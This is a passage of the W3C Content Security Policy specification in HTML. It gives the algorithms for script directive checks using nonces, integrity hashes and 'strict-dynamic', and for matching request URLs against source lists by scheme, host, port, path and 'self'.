  defined in <a href="https://www.w3.org/TR/SRI/#parse-metadata"><cite>SRI</cite> § 3.3.3 Parse metadata.</a> on <var>request</var>’s <a data-link-type="dfn" href="https://fetch.spec.whatwg.org/#concept-request-integrity-metadata" id="ref-for-concept-request-integrity-metadata">integrity metadata</a>. <a data-link-type="biblio" href="#biblio-sri" title="Subresource Integrity">[SRI]</a></p>
         <li data-md>
          <p>If <var>integrity sources</var> is "<code>no metadata</code>" or an empty set, skip
  the remaining substeps.</p>
         <li data-md>
          <p>Let <var>bypass due to integrity match</var> be <code>true</code>.</p>
         <li data-md>
          <p>For each <var>source</var> in <var>integrity sources</var>:</p>
          <ol>
           <li data-md>
            <p>If <var>directive</var>’s <a data-link-type="dfn" href="#directive-value" id="ref-for-directive-value⑤⑤">value</a> does not
  contain a <a data-link-type="dfn" href="#source-expression" id="ref-for-source-expression⑥">source expression</a> whose <a data-link-type="grammar" href="#grammardef-hash-algorithm" id="ref-for-grammardef-hash-algorithm①">hash-algorithm</a> is an <a data-link-type="dfn" href="https://infra.spec.whatwg.org/#ascii-case-insensitive" id="ref-for-ascii-case-insensitive④">ASCII case-insensitive</a> match
  for <var>source</var>’s <a data-link-type="grammar" href="#grammardef-hash-algorithm" id="ref-for-grammardef-hash-algorithm②">hash-algorithm</a>, and whose <a data-link-type="grammar" href="#grammardef-base64-value" id="ref-for-grammardef-base64-value④">base64-value</a> is <a data-link-type="dfn" href="https://infra.spec.whatwg.org/#string-is" id="ref-for-string-is">identical to</a> <var>source</var>’s <code>base64-value</code>, then set <var>bypass due to
  integrity match</var> to <code>false</code>.</p>
          </ol>
         <li data-md>
          <p>If <var>bypass due to integrity match</var> is <code>true</code>, return
  "<code>Allowed</code>".</p>
        </ol>
        <p class="note" role="note"><span class="marker">Note:</span> Here, we verify only that the <var>request</var> contains a set of <a data-link-type="dfn" href="https://fetch.spec.whatwg.org/#concept-request-integrity-metadata" id="ref-for-concept-request-integrity-metadata①">integrity metadata</a> which is a subset of the <a data-link-type="grammar" href="#grammardef-hash-source" id="ref-for-grammardef-hash-source⑤">hash-source</a> <a data-link-type="dfn" href="#source-expression" id="ref-for-source-expression⑦">source expressions</a> specified by <var>directive</var>. We rely on the browser’s enforcement of Subresource
  Integrity <a data-link-type="biblio" href="#biblio-sri" title="Subresource Integrity">[SRI]</a> to block non-matching resources upon response.</p>
       <li data-md>
        <p>If <var>directive</var>’s <a data-link-type="dfn" href="#directive-value" id="ref-for-directive-value⑤⑥">value</a> contains a <a data-link-type="dfn" href="#source-expression" id="ref-for-source-expression⑧">source
  expression</a> that is an <a data-link-type="dfn" href="https://infra.spec.whatwg.org/#ascii-case-insensitive" id="ref-for-ascii-case-insensitive⑤">ASCII case-insensitive</a> match for
  the "<a data-link-type="grammar" href="#grammardef-strict-dynamic" id="ref-for-grammardef-strict-dynamic"><code>'strict-dynamic'</code></a>" <a data-link-type="grammar" href="#grammardef-keyword-source" id="ref-for-grammardef-keyword-source③">keyword-source</a>:</p>
        <ol>
         <li data-md>
          <p>If the <var>request</var>’s <a data-link-type="dfn" href="https://fetch.spec.whatwg.org/#concept-request-parser-metadata" id="ref-for-concept-request-parser-metadata①">parser metadata</a> is <a data-link-type="dfn" href="https://html.spec.whatwg.org/#parser-inserted" id="ref-for-parser-inserted①">"parser-inserted"</a>, return "<code>Blocked</code>".</p>
          <p>Otherwise, return "<code>Allowed</code>".</p>
          <p class="note" role="note"><span class="marker">Note:</span> "<a data-link-type="grammar" href="#grammardef-strict-dynamic" id="ref-for-grammardef-strict-dynamic①"><code>'strict-dynamic'</code></a>" is explained in more detail
  in <a href="#strict-dynamic-usage">§ 8.2 Usage of "'strict-dynamic'"</a>.</p>
        </ol>
       <li data-md>
        <p>If the result of executing <a href="#match-request-to-source-list">§ 6.6.2.3 Does request match source list?</a> on <var>request</var>, <var>directive</var>’s <a data-link-type="dfn" href="#directive-value" id="ref-for-directive-value⑤⑦">value</a>, and <var>policy</var>,
  is "<code>Does Not Match</code>", return "<code>Blocked</code>".</p>
      </ol>
     <li data-md>
      <p>Return "<code>Allowed</code>".</p>
    </ol>
    <h5 class="heading settled algorithm" data-algorithm="Script directives post-request check" data-level="6.6.1.2" id="script-post-request"><span class="secno">6.6.1.2. </span><span class="content"> Script directives post-request check </span><a class="self-link" href="#script-post-request"></a></h5>
    <p>This directive’s <a data-link-type="dfn" href="#directive-post-request-check" id="ref-for-directive-post-request-check②⓪">post-request check</a> is as follows:</p>
    <p>Given a <a data-link-type="dfn" href="https://fetch.spec.whatwg.org/#concept-request" id="ref-for-concept-request⑥⓪">request</a> (<var>request</var>), a <a data-link-type="dfn" href="https://fetch.spec.whatwg.org/#concept-response" id="ref-for-concept-response④①">response</a> (<var>response</var>),
  a <a data-link-type="dfn" href="#directives" id="ref-for-directives②⑨">directive</a> (<var>directive</var>), and a <a data-link-type="dfn" href="#content-security-policy-object" id="ref-for-content-security-policy-object⑦⑦">policy</a> (<var>policy</var>):</p>
    <ol>
     <li data-md>
      <p>If <var>request</var>’s <a data-link-type="dfn" href="https://fetch.spec.whatwg.org/#concept-request-destination" id="ref-for-concept-request-destination⑥">destination</a> is <a data-link-type="dfn" href="https://fetch.spec.whatwg.org/#request-destination-script-like" id="ref-for-request-destination-script-like②">script-like</a>:</p>
      <ol>
       <li data-md>
        <p>If the result of executing <a href="#match-nonce-to-source-list">§ 6.6.2.2 Does nonce match source list?</a> on <var>request</var>’s <a data-link-type="dfn" href="https://fetch.spec.whatwg.org/#concept-request-nonce-metadata" id="ref-for-concept-request-nonce-metadata⑥">cryptographic nonce metadata</a> and this
  directive’s <a data-link-type="dfn" href="#directive-value" id="ref-for-directive-value⑤⑧">value</a> is "<code>Matches</code>", return
  "<code>Allowed</code>".</p>
       <li data-md>
        <p>If <var>directive</var>’s <a data-link-type="dfn" href="#directive-value" id="ref-for-directive-value⑤⑨">value</a> contains
  "<a data-link-type="grammar" href="#grammardef-strict-dynamic" id="ref-for-grammardef-strict-dynamic②"><code>'strict-dynamic'</code></a>", and <var>request</var>’s <a data-link-type="dfn" href="https://fetch.spec.whatwg.org/#concept-request-parser-metadata" id="ref-for-concept-request-parser-metadata②">parser metadata</a> is not <a data-link-type="dfn" href="https://html.spec.whatwg.org/#parser-inserted" id="ref-for-parser-inserted②">"parser-inserted"</a>,
  return "<code>Allowed</code>".</p>
       <li data-md>
        <p>If the result of executing <a href="#match-response-to-source-list">§ 6.6.2.4 Does response to request match source list?</a> on <var>response</var>, <var>request</var>, <var>directive</var>’s <a data-link-type="dfn" href="#directive-value" id="ref-for-directive-value⑥⓪">value</a>,
  and <var>policy</var>, is "<code>Does Not Match</code>", return "<code>Blocked</code>".</p>
      </ol>
     <li data-md>
      <p>Return "<code>Allowed</code>".</p>
    </ol>
    <h4 class="heading settled" data-level="6.6.2" id="matching-urls"><span class="secno">6.6.2. </span><span class="content">URL Matching</span><a class="self-link" href="#matching-urls"></a></h4>
    <h5 class="heading settled algorithm" data-algorithm="Does request violate policy?" data-level="6.6.2.1" id="does-request-violate-policy"><span class="secno">6.6.2.1. </span><span class="content"> Does <var>request</var> violate <var>policy</var>? </span><a class="self-link" href="#does-request-violate-policy"></a></h5>
    <p>Given a <a data-link-type="dfn" href="https://fetch.spec.whatwg.org/#concept-request" id="ref-for-concept-request⑥①">request</a> (<var>request</var>) and a <a data-link-type="dfn" href="#content-security-policy-object" id="ref-for-content-security-policy-object⑦⑧">policy</a> (<var>policy</var>), this
  algorithm returns the violated <a data-link-type="dfn" href="#directives" id="ref-for-directives③⓪">directive</a> if the request violates the
  policy, and "<code>Does Not Violate</code>" otherwise.</p>
    <ol>
     <li data-md>
      <p>Let <var>violates</var> be "<code>Does Not Violate</code>".</p>
     <li data-md>
      <p>For each <var>directive</var> in <var>policy</var>:</p>
      <ol>
       <li data-md>
        <p>Let <var>result</var> be the result of executing <var>directive</var>’s <a data-link-type="dfn" href="#directive-pre-request-check" id="ref-for-directive-pre-request-check①⑨">pre-request check</a> on <var>request</var> and <var>policy</var>.</p>
       <li data-md>
        <p>If <var>result</var> is "<code>Blocked</code>", then let <var>violates</var> be <var>directive</var>.</p>
      </ol>
     <li data-md>
      <p>Return <var>violates</var>.</p>
    </ol>
    <h5 class="heading settled algorithm" data-algorithm="Does nonce match source list?" data-level="6.6.2.2" id="match-nonce-to-source-list"><span class="secno">6.6.2.2. </span><span class="content"> Does <var>nonce</var> match <var>source list</var>? </span><a class="self-link" href="#match-nonce-to-source-list"></a></h5>
    <p>Given a <a data-link-type="dfn" href="https://fetch.spec.whatwg.org/#concept-request" id="ref-for-concept-request⑥②">request</a>’s <a data-link-type="dfn" href="https://fetch.spec.whatwg.org/#concept-request-nonce-metadata" id="ref-for-concept-request-nonce-metadata⑦">cryptographic nonce metadata</a> (<var>nonce</var>) and a <a data-link-type="dfn" href="#source-lists" id="ref-for-source-lists①②">source list</a> (<var>source list</var>), this algorithm returns
  "<code>Matches</code>" if the nonce matches one or more source expressions in the list,
  and "<code>Does Not Match</code>" otherwise:</p>
    <ol>
     <li data-md>
      <p class="assertion">Assert: <var>source list</var> is not <code>null</code>.</p>
     <li data-md>
      <p>If <var>nonce</var> is the empty string, return "<code>Does Not Match</code>".</p>
     <li data-md>
      <p>For each <var>expression</var> in <var>source list</var>:</p>
      <ol>
       <li data-md>
        <p>If <var>expression</var> matches the <a data-link-type="grammar" href="#grammardef-nonce-source" id="ref-for-grammardef-nonce-source④"><code>nonce-source</code></a> grammar,
  and <var>nonce</var> is <a data-link-type="dfn" href="https://infra.spec.whatwg.org/#string-is" id="ref-for-string-is①">identical to</a> <var>expression</var>’s <a data-link-type="grammar" href="#grammardef-base64-value" id="ref-for-grammardef-base64-value⑤"><code>base64-value</code></a> part, return "<code>Matches</code>".</p>
      </ol>
     <li data-md>
      <p>Return "<code>Does Not Match</code>".</p>
    </ol>
    <h5 class="heading settled algorithm" data-algorithm="Does request match source list?" data-level="6.6.2.3" id="match-request-to-source-list"><span class="secno">6.6.2.3. </span><span class="content"> Does <var>request</var> match <var>source list</var>? </span><a class="self-link" href="#match-request-to-source-list"></a></h5>
    <p>Given a <a data-link-type="dfn" href="https://fetch.spec.whatwg.org/#concept-request" id="ref-for-concept-request⑥③">request</a> (<var>request</var>), a <a data-link-type="dfn" href="#source-lists" id="ref-for-source-lists①③">source list</a> (<var>source list</var>),
  and a <a data-link-type="dfn" href="#content-security-policy-object" id="ref-for-content-security-policy-object⑦⑨">policy</a> (<var>policy</var>), this algorithm returns the result of executing <a href="#match-url-to-source-list">§ 6.6.2.5 Does url match source list in origin with redirect count?</a> on <var>request</var>’s <a data-link-type="dfn" href="https://fetch.spec.whatwg.org/#concept-request-current-url" id="ref-for-concept-request-current-url③">current url</a>, <var>source list</var>, <var>policy</var>’s <a data-link-type="dfn" href="#policy-self-origin" id="ref-for-policy-self-origin④">self-origin</a>, and <var>request</var>’s <a data-link-type="dfn" href="https://fetch.spec.whatwg.org/#concept-request-redirect-count" id="ref-for-concept-request-redirect-count">redirect count</a>.</p>
    <p class="note" role="note"><span class="marker">Note:</span> This is generally used in <a data-link-type="dfn" href="#directives" id="ref-for-directives③①">directives</a>' <a data-link-type="dfn" href="#directive-pre-request-check" id="ref-for-directive-pre-request-check②⓪">pre-request check</a> algorithms to verify that a given <a data-link-type="dfn" href="https://fetch.spec.whatwg.org/#concept-request" id="ref-for-concept-request⑥④">request</a> is reasonable.</p>
    <h5 class="heading settled algorithm" data-algorithm="Does response to request match source list?" data-level="6.6.2.4" id="match-response-to-source-list"><span class="secno">6.6.2.4. </span><span class="content"> Does <var>response</var> to <var>request</var> match <var>source list</var>? </span><a class="self-link" href="#match-response-to-source-list"></a></h5>
    <p>Given a <a data-link-type="dfn" href="https://fetch.spec.whatwg.org/#concept-request" id="ref-for-concept-request⑥⑤">request</a> (<var>request</var>), and a <a data-link-type="dfn" href="#source-lists" id="ref-for-source-lists①④">source list</a> (<var>source list</var>),
  and a <a data-link-type="dfn" href="#content-security-policy-object" id="ref-for-content-security-policy-object⑧⓪">policy</a> (<var>policy</var>), this algorithm returns the result of executing <a href="#match-url-to-source-list">§ 6.6.2.5 Does url match source list in origin with redirect count?</a> on <var>response</var>’s <a data-link-type="dfn" href="https://fetch.spec.whatwg.org/#concept-response-url" id="ref-for-concept-response-url④">url</a>, <var>source list</var>, <var>policy</var>’s <a data-link-type="dfn" href="#policy-self-origin" id="ref-for-policy-self-origin⑤">self-origin</a>, and <var>request</var>’s <a data-link-type="dfn" href="https://fetch.spec.whatwg.org/#concept-request-redirect-count" id="ref-for-concept-request-redirect-count①">redirect count</a>.</p>
    <p class="note" role="note"><span class="marker">Note:</span> This is generally used in <a data-link-type="dfn" href="#directives" id="ref-for-directives③②">directives</a>' <a data-link-type="dfn" href="#directive-post-request-check" id="ref-for-directive-post-request-check②①">post-request check</a> algorithms to verify that a given <a data-link-type="dfn" href="https://fetch.spec.whatwg.org/#concept-response" id="ref-for-concept-response④②">response</a> is reasonable.</p>
    <h5 class="heading settled algorithm" data-algorithm="Does url match source list in origin with redirect count?" data-level="6.6.2.5" id="match-url-to-source-list"><span class="secno">6.6.2.5. </span><span class="content"> Does <var>url</var> match <var>source list</var> in <var>origin</var> with <var>redirect count</var>? </span><a class="self-link" href="#match-url-to-source-list"></a></h5>
    <p>Given a <code class="idl"><a data-link-type="idl" href="https://url.spec.whatwg.org/#url" id="ref-for-url⑨">URL</a></code> (<var>url</var>), a <a data-link-type="dfn" href="#source-lists" id="ref-for-source-lists①⑤">source list</a> (<var>source list</var>), an <a data-link-type="dfn" href="https://html.spec.whatwg.org/#concept-origin" id="ref-for-concept-origin①">origin</a> (<var>origin</var>), and a number (<var>redirect count</var>), this
  algorithm returns "<code>Matches</code>" if the URL matches one or more source
  expressions in <var>source list</var>, or "<code>Does Not Match</code>" otherwise:</p>
    <ol>
     <li data-md>
      <p class="assertion">Assert: <var>source list</var> is not <code>null</code>.</p>
     <li data-md>
      <p>If <var>source list</var> is an empty list, return "<code>Does Not Match</code>".</p>
     <li data-md>
      <p>If <var>source list</var> contains a single item which is an <a data-link-type="dfn" href="https://infra.spec.whatwg.org/#ascii-case-insensitive" id="ref-for-ascii-case-insensitive⑥">ASCII
  case-insensitive</a> match for the string "<code>'none'</code>", return "<code>Does Not       Match</code>".</p>
      <p class="note" role="note"><span class="marker">Note:</span> An empty source list (that is, a directive without a value: <code>script-src</code>,
  as opposed to <code>script-src host1</code>) is equivalent to a source list containing <code>'none'</code>,
  and will not match any URL.</p>
     <li data-md>
      <p>For each <var>expression</var> in <var>source list</var>:</p>
      <ol>
       <li data-md>
        <p>If <a href="#match-url-to-source-expression">§ 6.6.2.6 Does url match expression in origin with redirect count?</a> returns "<code>Matches</code>" when
  executed upon <var>url</var>, <var>expression</var>, <var>origin</var>, and <var>redirect count</var>, return
  "<code>Matches</code>".</p>
      </ol>
     <li data-md>
      <p>Return "<code>Does Not Match</code>".</p>
    </ol>
    <h5 class="heading settled algorithm" data-algorithm="Does url match expression in origin with redirect count?" data-level="6.6.2.6" id="match-url-to-source-expression"><span class="secno">6.6.2.6. </span><span class="content"> Does <var>url</var> match <var>expression</var> in <var>origin</var> with <var>redirect count</var>? </span><a class="self-link" href="#match-url-to-source-expression"></a></h5>
    <p>Given a <code class="idl"><a data-link-type="idl" href="https://url.spec.whatwg.org/#url" id="ref-for-url①⓪">URL</a></code> (<var>url</var>), a <a data-link-type="dfn" href="#source-expression" id="ref-for-source-expression⑨">source expression</a> (<var>expression</var>), an <a data-link-type="dfn" href="https://html.spec.whatwg.org/#concept-origin" id="ref-for-concept-origin②">origin</a> (<var>origin</var>), and a number (<var>redirect count</var>), this algorithm
  returns "<code>Matches</code>" if <var>url</var> matches <var>expression</var>, and "<code>Does Not Match</code>"
  otherwise.</p>
    <p class="note" role="note"><span class="marker">Note:</span> <var>origin</var> is the <a data-link-type="dfn" href="https://html.spec.whatwg.org/#concept-origin" id="ref-for-concept-origin③">origin</a> of the resource relative to which the <var>expression</var> should be resolved. "<code>'self'</code>", for instance, will have distinct
  meaning depending on that bit of context.</p>
    <ol>
     <li data-md>
      <p>If <var>expression</var> is the string "*", return "<code>Matches</code>" if one or more of
  the following conditions is met:</p>
      <ol>
       <li data-md>
        <p><var>url</var>’s <a data-link-type="dfn" href="https://url.spec.whatwg.org/#concept-url-scheme" id="ref-for-concept-url-scheme③">scheme</a> is an <a data-link-type="dfn" href="https://fetch.spec.whatwg.org/#http-scheme" id="ref-for-http-scheme②">HTTP(S) scheme</a>.</p>
       <li data-md>
        <p><var>url</var>’s <a data-link-type="dfn" href="https://url.spec.whatwg.org/#concept-url-scheme" id="ref-for-concept-url-scheme④">scheme</a> is the same as <var>origin</var>’s <a data-link-type="dfn" href="https://html.spec.whatwg.org/multipage/browsers.html#concept-origin-scheme" id="ref-for-concept-origin-scheme">scheme</a>.</p>
      </ol>
      <p class="note" role="note"><span class="marker">Note:</span> This logic means that in order to allow a resource from a non-<a data-link-type="dfn" href="https://fetch.spec.whatwg.org/#http-scheme" id="ref-for-http-scheme③">HTTP(S) scheme</a>,
  it has to be either explicitly specified (e.g. <code>default-src * data: custom-scheme-1: custom-scheme-2:</code>),
  or the protected resource must be loaded from the same scheme.</p>
     <li data-md>
      <p>If <var>expression</var> matches the <a data-link-type="grammar" href="#grammardef-scheme-source" id="ref-for-grammardef-scheme-source②"><code>scheme-source</code></a> or <a data-link-type="grammar" href="#grammardef-host-source" id="ref-for-grammardef-host-source②"><code>host-source</code></a> grammar:</p>
      <ol>
       <li data-md>
        <p>If <var>expression</var> has a <a data-link-type="grammar" href="#grammardef-scheme-part" id="ref-for-grammardef-scheme-part②"><code>scheme-part</code></a>, and it does not <a data-link-type="dfn" href="#scheme-part-match" id="ref-for-scheme-part-match"><code>scheme-part</code> match</a> <var>url</var>’s <a data-link-type="dfn" href="https://url.spec.whatwg.org/#concept-url-scheme" id="ref-for-concept-url-scheme⑤">scheme</a>, return "<code>Does Not Match</code>".</p>
       <li data-md>
        <p>If <var>expression</var> matches the <a data-link-type="grammar" href="#grammardef-scheme-source" id="ref-for-grammardef-scheme-source③"><code>scheme-source</code></a> grammar,
  return "<code>Matches</code>".</p>
      </ol>
     <li data-md>
      <p>If <var>expression</var> matches the <a data-link-type="grammar" href="#grammardef-host-source" id="ref-for-grammardef-host-source③"><code>host-source</code></a> grammar:</p>
      <ol>
       <li data-md>
        <p>If <var>url</var>’s <code class="idl"><a data-link-type="idl" href="https://url.spec.whatwg.org/#dom-url-host" id="ref-for-dom-url-host">host</a></code> is <code>null</code>, return "<code>Does Not Match</code>".</p>
       <li data-md>
        <p>If <var>expression</var> does not have a <a data-link-type="grammar" href="#grammardef-scheme-part" id="ref-for-grammardef-scheme-part③"><code>scheme-part</code></a>, and <var>origin</var>’s <a data-link-type="dfn" href="https://html.spec.whatwg.org/multipage/browsers.html#concept-origin-scheme" id="ref-for-concept-origin-scheme①">scheme</a> does not <a data-link-type="dfn" href="#scheme-part-match" id="ref-for-scheme-part-match①"><code>scheme-part</code> match</a> <var>url</var>’s <a data-link-type="dfn" href="https://url.spec.whatwg.org/#concept-url-scheme" id="ref-for-concept-url-scheme⑥">scheme</a>,
  return "<code>Does Not Match</code>".</p>
        <p class="note" role="note"><span class="marker">Note:</span> As with <a data-link-type="grammar" href="#grammardef-scheme-part" id="ref-for-grammardef-scheme-part④"><code>scheme-part</code></a> above, we allow schemeless <a data-link-type="grammar" href="#grammardef-host-source" id="ref-for-grammardef-host-source④"><code>host-source</code></a> expressions to be upgraded from insecure
  schemes to secure schemes.</p>
       <li data-md>
        <p>If <var>expression</var>’s <a data-link-type="grammar" href="#grammardef-host-part" id="ref-for-grammardef-host-part①"><code>host-part</code></a> does not <a data-link-type="dfn" href="#host-part-match" id="ref-for-host-part-match"><code>host-part</code> match</a> <var>url</var>’s <code class="idl"><a data-link-type="idl" href="https://url.spec.whatwg.org/#dom-url-host" id="ref-for-dom-url-host①">host</a></code>, return "<code>Does Not Match</code>".</p>
       <li data-md>
        <p>Let <var>port-part</var> be <var>expression</var>’s <a data-link-type="grammar" href="#grammardef-port-part" id="ref-for-grammardef-port-part①"><code>port-part</code></a> if present, and <code>null</code> otherwise.</p>
       <li data-md>
        <p>If <var>port-part</var> does not <a data-link-type="dfn" href="#port-part-matches" id="ref-for-port-part-matches"><code>port-part</code> match</a> <var>url</var>’s <a data-link-type="dfn" href="https://url.spec.whatwg.org/#concept-url-port" id="ref-for-concept-url-port">port</a> and <var>url</var>’s <a data-link-type="dfn" href="https://url.spec.whatwg.org/#concept-url-scheme" id="ref-for-concept-url-scheme⑦">scheme</a>, return "<code>Does Not Match</code>".</p>
       <li data-md>
        <p>If <var>expression</var> contains a non-empty <a data-link-type="grammar" href="#grammardef-path-part" id="ref-for-grammardef-path-part①"><code>path-part</code></a>, and <var>redirect count</var> is 0, then:</p>
        <ol>
         <li data-md>
          <p>Let <var>path</var> be the resulting of joining <var>url</var>’s <a data-link-type="dfn" href="https://url.spec.whatwg.org/#concept-url-path" id="ref-for-concept-url-path">path</a> on the U+002F SOLIDUS character (<code>/</code>).</p>
         <li data-md>
          <p>If <var>expression</var>’s <a data-link-type="grammar" href="#grammardef-path-part" id="ref-for-grammardef-path-part②"><code>path-part</code></a> does not <a data-link-type="dfn" href="#path-part-match" id="ref-for-path-part-match"><code>path-part</code> match</a> <var>path</var>,
  return "<code>Does Not Match</code>".</p>
        </ol>
       <li data-md>
        <p>Return "<code>Matches</code>".</p>
      </ol>
     <li data-md>
      <p>If <var>expression</var> is an <a data-link-type="dfn" href="https://infra.spec.whatwg.org/#ascii-case-insensitive" id="ref-for-ascii-case-insensitive⑦">ASCII case-insensitive</a> match for "<code>'self'</code>",
  return "<code>Matches</code>" if one or more of the following conditions is met:</p>
      <ol>
       <li data-md>
        <p><var>origin</var> is the same as <var>url</var>’s <a data-link-type="dfn" href="https://url.spec.whatwg.org/#concept-url-origin" id="ref-for-concept-url-origin①">origin</a></p>
       <li data-md>
        <p><var>origin</var>’s <code class="idl"><a data-link-type="idl" href="https://url.spec.whatwg.org/#dom-url-host" id="ref-for-dom-url-host②">host</a></code> is the same as <var>url</var>’s <code class="idl"><a data-link-type="idl" href="https://url.spec.whatwg.org/#dom-url-host" id="ref-for-dom-url-host③">host</a></code>, <var>origin</var>’s <code class="idl"><a data-link-type="idl" href="https://url.spec.whatwg.org/#dom-url-port" id="ref-for-dom-url-port">port</a></code> and <var>url</var>’s <code class="idl"><a data-link-type="idl" href="https://url.spec.whatwg.org/#dom-url-port" id="ref-for-dom-url-port①">port</a></code> are either the same
  or the <a data-link-type="dfn" href="https://url.spec.whatwg.org/#default-port" id="ref-for-default-port">default ports</a> for their respective <a data-link-type="dfn" href="https://url.spec.whatwg.org/#concept-url-scheme" id="ref-for-concept-url-scheme⑧">scheme</a>s, and
  one or more of the following conditions is met:</p>
        <ol>
         <li data-md>
          <p><var>url</var>’s <a data-link-type="dfn" href="https://url.spec.whatwg.org/#concept-url-scheme" id="ref-for-concept-url-scheme⑨">scheme</a> is "<code>https</code>" or "<code>wss</code>"</p>
         <li data-md>
          <p><var>origin</var>’s <a data-link-type="dfn" href="https://url.spec.whatwg.org/#concept-url-scheme" id="ref-for-concept-url-scheme①⓪">scheme</a> is "<code>http</code>" and <var>url</var>’s <a data-link-type="dfn" href="https://url.spec.whatwg.org/#concept-url-scheme" id="ref-for-concept-url-scheme①①">scheme</a> is "<code>http</code>" or "<code>ws</code>"</p>
        </ol>
      </ol>
      <p class="note" role="note"><span class="marker">Note:</span> Like the <a data-link-type="grammar" href="#grammardef-scheme-part" id="ref-for-grammardef-scheme-part⑤"><code>scheme-part</code></a> logic above, the "<code>'self'</code>"
  matching algorithm allows upgrades to secure schemes when it is safe to do
  so. We limit these upgrades to endpoints running on the default port for a
  particular scheme or a port that matches the origin of the protected
  resource, as this seems sufficient to deal with upgrades that can be
  reasonably expected to succeed.</p>
     <li data-md>
      <p>Return "<code>Does Not Match</code>".</p>
    </ol>
    <h5 class="heading settled algorithm" data-algorithm="scheme-part matching" data-level="6.6.2.7" id="match-schemes"><span class="secno">6.6.2.7. </span><span class="content"> <code>scheme-part</code> matching </span><a class="self-link" href="#match-schemes"></a></h5>
    <p>An <a data-link-type="dfn" href="https://infra.spec.whatwg.org/#ascii-string" id="ref-for-ascii-string⑤">ASCII string</a> <dfn class="dfn-paneled" data-dfn-type="dfn" data-export data-lt="scheme-part match" id="scheme-part-match"><code>scheme-part</code> matches</dfn> another <a data-link-type="dfn" href="https://infra.spec.whatwg.org/#ascii-string" id="ref-for-ascii-string⑥">ASCII string</a> if a CSP source expression that contained the first as a <a data-link-type="grammar" href="#grammardef-scheme-part" id="ref-for-grammardef-scheme-part⑥"><code>scheme-part</code></a> could potentially match a URL containing the latter as a <a data-link-type="dfn" href="https://url.spec.whatwg.org/#concept-url-scheme" id="ref-for-concept-url-scheme①②">scheme</a>. For example, we say that "http" <a data-link-type="dfn" href="#scheme-part-match" id="ref-for-scheme-part-match②"><code>scheme-part</code> matches</a> "https".</p>
    <p class="note" role="note"><span class="marker">Note:</span> The matching relation is asymmetric. For example, the source expressions <code>https:</code> and <code>https://example.com/</code> do not match the URL <code>http://example.com/</code>. We always allow a
  secure upgrade from an explicitly insecure expression. <code>script-src http:</code> is treated as equivalent
  to <code>script-src http: https:</code>, <code>script-src http://example.com</code> to <code>script-src http://example.com   https://example.com</code>, and <code>connect-src ws:</code> to <code>connect-src ws: wss:</code>.</p>
    <p>More formally, two <a data-link-type="dfn" href="https://infra.spec.whatwg.org/#ascii-string" id="ref-for-ascii-string⑦">ASCII strings</a> (<var>A</var> and <var>B</var>) are said to <a data-link-type="dfn" href="#scheme-part-match" id="ref-for-scheme-part-match③"><code>scheme-part</code> match</a> if the
  following algorithm returns "<code>Matches</code>":</p>
    <ol class="algorithm">
     <li data-md>
      <p>If one of the following is true, return "<code>Matches</code>":</p>
      <ol>
       <li data-md>
        <p><var>A</var> is an <a data-link-type="dfn" href="https://infra.spec.whatwg.org/#ascii-case-insensitive" id="ref-for-ascii-case-insensitive⑧">ASCII case-insensitive</a> match for <var>B</var>.</p>
       <li data-md>
        <p><var>A</var> is an <a data-link-type="dfn" href="https://infra.spec.whatwg.org/#ascii-case-insensitive" id="ref-for-ascii-case-insensitive⑨">ASCII case-insensitive</a> match for "<code>http</code>", and <var>B</var> is an <a data-link-type="dfn" href="https://infra.spec.whatwg.org/#ascii-case-insensitive" id="ref-for-ascii-case-insensitive①⓪">ASCII case-insensitive</a> match for "<code>https</code>".</p>
       <li data-md>
        <p><var>A</var> is an <a data-link-type="dfn" href="https://infra.spec.whatwg.org/#ascii-case-insensitive" id="ref-for-ascii-case-insensitive①①">ASCII case-insensitive</a> match for "<code>ws</code>", and <var>B</var> is an <a data-link-type="dfn" href="https://infra.spec.whatwg.org/#ascii-case-insensitive" id="ref-for-ascii-case-insensitive①②">ASCII case-insensitive</a> match for "<code>wss</code>", "<code>http</code>", or
  "<code>https</code>".</p>
       <li data-md>
        <p><var>A</var> is an <a data-link-type="dfn" href="https://infra.spec.whatwg.org/#ascii-case-insensitive" id="ref-for-ascii-case-insensitive①③">ASCII case-insensitive</a> match for "<code>wss</code>", and <var>B</var> is an <a data-link-type="dfn" href="https://infra.spec.whatwg.org/#ascii-case-insensitive" id="ref-for-ascii-case-insensitive①④">ASCII case-insensitive</a> match for "<code>https</code>".</p>
      </ol>
     <li data-md>
      <p>Return "<code>Does Not Match</code>".</p>
    </ol>
    <h5 class="heading settled algorithm" data-algorithm="host-part matching" data-level="6.6.2.8" id="match-hosts"><span class="secno">6.6.2.8. </span><span class="content"> <code>host-part</code> matching </span><a class="self-link" href="#match-hosts"></a></h5>
    <p>An <a data-link-type="dfn" href="https://infra.spec.whatwg.org/#ascii-string" id="ref-for-ascii-string⑧">ASCII string</a> <dfn class="dfn-paneled" data-dfn-type="dfn" data-export data-lt="host-part match" id="host-part-match"><code>host-part</code> matches</dfn> another <a data-link-type="dfn" href="https://infra.spec.whatwg.org/#ascii-string" id="ref-for-ascii-string⑨">ASCII
  string</a> if a CSP source expression that contained the first as a <a data-link-type="grammar" href="#grammardef-host-part" id="ref-for-grammardef-host-part②"><code>host-part</code></a> could
  potentially match a URL containing the latter as a <a data-link-type="dfn" href="https://url.spec.whatwg.org/#concept-url-host" id="ref-for-concept-url-host">host</a>. For example, we say that
  "www.example.com" <a data-link-type="dfn" href="#host-part-match" id="ref-for-host-part-match①">host-part matches</a> "www.example.com".</p>
    <p>More formally, two <a data-link-type="dfn" href="https://infra.spec.whatwg.org/#ascii-string" id="ref-for-ascii-string①⓪">ASCII strings</a> (<var>A</var> and <var>B</var>) are said to <a data-link-type="dfn" href="#host-part-match" id="ref-for-host-part-match②"><code>host-part</code> match</a> if the
  following algorithm returns "<code>Matches</code>":</p>
    <p class="note" role="note"><span class="marker">Note:</span> The matching relation is asymmetric. That is, <var>A</var> matching <var>B</var> does not
  mean that <var>B</var> will match <var>A</var>. For example, <code>*.example.com</code> <a data-link-type="dfn" href="#host-part-match" id="ref-for-host-part-match③"><code>host-part</code> matches</a> <code>www.example.com</code>, but <code>www.example.com</code> does not <a data-link-type="dfn" href="#host-part-match" id="ref-for-host-part-match④"><code>host-part</code> match</a> <code>*.example.com</code>.</p>
    <ol class="algorithm">
     <li data-md>
      <p>If the first character of <var>A</var> is an U+002A ASTERISK character (<code>*</code>):</p>
      <ol>
       <li data-md>
        <p>Let <var>remaining</var> be the result of removing the leading ("*") from <var>A</var>.</p>
       <li data-md>
        <p>If <var>remaining</var> (including the leading U+002E FULL STOP character
